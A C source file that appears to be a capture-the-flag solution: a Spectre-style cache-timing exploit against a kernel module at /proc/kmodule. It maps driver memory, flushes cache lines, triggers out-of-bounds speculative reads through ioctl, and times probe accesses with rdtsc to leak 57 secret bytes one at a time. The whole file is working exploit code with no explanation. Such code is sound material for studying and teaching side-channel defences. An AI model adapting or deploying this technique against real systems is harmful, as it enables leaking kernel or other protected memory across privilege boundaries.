#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <x86intrin.h>

int open_kern(char driver[]) {
	int fd;
	fd = open(driver, O_RDWR);
	if (fd == -1) {
		printf("failed to open driver\n");
		exit(-1);
	}
	printf("driver opend for bidness\n");
	return fd;
}

void flush_cache(uint64_t addr) {
	for (int i = 0; i < 256; i++) {
		_mm_clflush((void *)(addr+(i << 0xc)));
	}
}

void train(int fd, void *shared) {
	((uint8_t *)shared)[0] = 0x00;
	((uint8_t *)shared)[1] = 0x1e;
	ioctl(fd, 0, 0);
}

void mal(int fd, int idx, void *shared) {
	((uint8_t *)shared)[0] = idx;
	((uint8_t *)shared)[1] = 0x14;
	ioctl(fd, 0, 0);
}

uint64_t time_access(void *shared, int idx) {
	uint64_t stime, etime;
	_mm_mfence();
	stime = __rdtsc();
	volatile uint8_t x = *(uint8_t *)(shared+(idx << 0xc));
	_mm_lfence();
	etime = __rdtsc();
	return (etime - stime);
}

int main() {
	int fd;
	char buf[64];
	
	fd = open_kern("/proc/kmodule");
	void *shared = mmap(NULL,0x100000,PROT_READ|PROT_WRITE,O_RDWR|MAP_SHARED,fd,0);
	printf("mmap @ 0x%llx\n", shared);

	flush_cache((uint64_t)shared);
	
	for (int idx = 0; idx < 57;) {
		
		flush_cache((uint64_t)shared);
		mal(fd, idx, shared);
		sched_yield();
	
		for (int i = 0; i < 256; i++) {
			int mix_i = ((i * 167) + 13) & 255;
			int cycles = time_access(shared, mix_i);
			if (mix_i != 0 && cycles < 140) {
				buf[idx] = mix_i;
				idx++;
				printf("%s\n", buf);
				break;
			}
		}
	}
	
	printf("%s\n", buf);
	close(fd);
	return 0;
}
